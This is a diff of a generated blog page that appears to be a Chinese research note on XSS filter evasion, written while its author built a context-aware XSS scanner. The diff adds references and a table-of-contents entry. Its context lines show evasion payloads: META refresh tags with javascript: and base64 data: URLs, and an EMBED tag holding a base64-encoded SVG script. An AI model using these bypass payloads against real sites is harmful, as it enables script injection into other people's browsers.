@@ -106,7 +106,7 @@
 <meta property="og:image" content="https://eviloh.github.io/images/XSS_Filter/js_statement.png">
 <meta property="og:image" content="https://eviloh.github.io/images/XSS_Filter/network.png">
 <meta property="og:image" content="https://eviloh.github.io/images/XSS_Filter/success.png">
-<meta property="og:updated_time" content="2018-08-01T15:41:48.398Z">
+<meta property="og:updated_time" content="2018-08-02T03:38:44.487Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS Filter Evasion Cheat Sheet研究">
 <meta name="twitter:description" content="前言这段时间在公司写XSS扫描器，之前留下的脚本是遍历payload list的暴力扫描，而我的任务是修改为类似于SQLMAP的智能扫描模式。 在寻找到输入输出点之后，我开始思考智能化扫描能给扫描器带来什么样的提升。 直到今天，我才有了一个初步的答案：根据上下文环境，定制payload。 定制化的payload不仅能够根据WEB前端框架选择payload以减少扫描流量，还能根据输出点的实际情况判断">
@@ -401,6 +401,11 @@
 <p>使用meta标签：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"refresh"</span> <span class="attr">CONTENT</span>=<span class="string">"0;url=javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"refresh"</span> <span class="attr">CONTENT</span>=<span class="string">"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"refresh"</span> <span class="attr">CONTENT</span>=<span class="string">"0; URL=http://;URL=javascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>插入含有xss代码的flash， 可以添加属性<code>allowScriptAccess=&quot;never&quot;</code>以及<code>allownetworking=&quot;internal&quot;</code>来减小被过滤的风险<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EMBED</span> <span class="attr">SRC</span>=<span class="string">"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="</span> <span class="attr">type</span>=<span class="string">"image/svg+xml"</span> <span class="attr">AllowScriptAccess</span>=<span class="string">"always"</span>&gt;</span><span class="tag">&lt;/<span class="name">EMBED</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>xss的绕过过滤技巧极多，受到浏览器、 上下文、 编码、 前端框架等多种因素影响，不管是手动测试还是集成为扫描器，都不是一蹴而就的事情，需要长时间的积累和迭代。 后面我会总结一个xss过滤速查表，力求能够更上攻击载荷更新的步伐。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
+<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">XSS Filter Evasion Cheat Sheet</a></li>
+<li><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">SVG XSS的一个黑魔法</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html" target="_blank" rel="noopener">利用location来变形我们的XSS PAYLOAD</a></li>
+</ol>
 
       
     </div>
@@ -577,7 +582,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一个绝妙的适应性payload"><span class="nav-number">2.</span> <span class="nav-text">一个绝妙的适应性payload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用特殊编码绕过特殊字符过滤"><span class="nav-number">3.</span> <span class="nav-text">利用特殊编码绕过特殊字符过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过关键字过滤"><span class="nav-number">4.</span> <span class="nav-text">绕过关键字过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#零散的技巧"><span class="nav-number">5.</span> <span class="nav-text">零散的技巧</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后话"><span class="nav-number">6.</span> <span class="nav-text">后话</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一个绝妙的适应性payload"><span class="nav-number">2.</span> <span class="nav-text">一个绝妙的适应性payload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用特殊编码绕过特殊字符过滤"><span class="nav-number">3.</span> <span class="nav-text">利用特殊编码绕过特殊字符过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过关键字过滤"><span class="nav-number">4.</span> <span class="nav-text">绕过关键字过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#零散的技巧"><span class="nav-number">5.</span> <span class="nav-text">零散的技巧</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后话"><span class="nav-number">6.</span> <span class="nav-text">后话</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">7.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
             
 
           </div>
